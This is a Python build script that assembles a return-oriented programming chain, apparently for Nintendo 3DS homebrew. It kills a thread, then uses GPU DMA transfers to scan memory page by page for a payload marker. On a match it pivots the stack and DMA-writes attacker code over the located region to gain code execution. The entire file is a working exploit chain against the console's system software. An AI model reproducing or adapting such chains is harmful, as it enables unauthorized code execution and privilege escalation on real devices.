include("../ropdb/DB.py")
from constants import *
import os
include("macros.py")

LOOP_DST = LINEAR_BUFFER + 0x1D00000
INITIAL_DST = LINEAR_BUFFER + 0x1B00000

set_mem_offset(ROP_LOADER_PTR+os.path.getsize("build/rop_loader.bin")) # this rop is right after rop loader

put_label("start")

deref_to_r0(APPMEMTYPE)
add_r0(0x100000000-0x6)
compare_r0_0()
store_if_equal(LINEAR_BUFFER + 0x07C00000 - CODEBIN_MAX_SIZE, loop_src)
store(SVC_EXITTHREAD, ANNOYING_THREAD_KILL)

put_label("scan_loop")

add_word(GSPGPU_GXTRYENQUEUE_WRAPPER)
add_word(0x4)
put_label("loop_src")
add_word(LINEAR_BUFFER + 0x04000000 - CODEBIN_MAX_SIZE)
add_word(LOOP_DST)
add_word(SCANLOOP_STRIDE)
add_word(0xFFFFFFFF)
add_word(0xFFFFFFFF)
add_word(0x8)
add_word(0x0)

add_word(0x0)

garbage(4)

sleep(200*1000)

store(GSPGPU_GXTRYENQUEUE_WRAPPER, scan_loop)
flush_dcache(LOOP_DST, SCANLOOP_STRIDE)

memcmp(LOOP_DST, PAYLOAD_VA, 0x20)
compare_r0_0()
store_if_equal(NOP, loop_pivot)

deref_to_r0(loop_src)
add_r0(SCANLOOP_STRIDE) #next mempage
store_r0(loop_src)

pop(r0=NOP_ptr_min_0x8)

pop(r0=scan_loop, r1=NOP)
put_label("loop_pivot")
add_word(MOV_SPR0_MOV_R0R2_MOV_LRR3_BX_R1)


deref_to_r0(loop_src)
add_r0(0x100000000 - SCANLOOP_STRIDE) #after the scanloop is broken, magicval is at *(loop_src) - SCANLOOP_STRIDE
store_r0(final_dst)                   #store the location for the final gspwn

memcpy(INITIAL_DST, OTHERAPP_PTR + os.path.getsize('../otherapp.bin'), os.path.getsize('../code/code.bin'))

flush_dcache(INITIAL_DST, 0x100000)

add_word(GSPGPU_GXTRYENQUEUE_WRAPPER)
add_word(0x4)
add_word(INITIAL_DST)
put_label("final_dst")
add_word(0xDEADC0DE)
add_word(0x2000)
add_word(0xFFFFFFFF)
add_word(0xFFFFFFFF)
add_word(0x8)
add_word(0x0)

add_word(0x0)

garbage(4)

sleep(1000*1000*1000)

add_word(PAYLOAD_VA)

put_label("NOP_ptr_min_0x8")
add_word(NOP_ptr_min_0x8)

add_word(0x0)
add_word(NOP)

put_label("end")
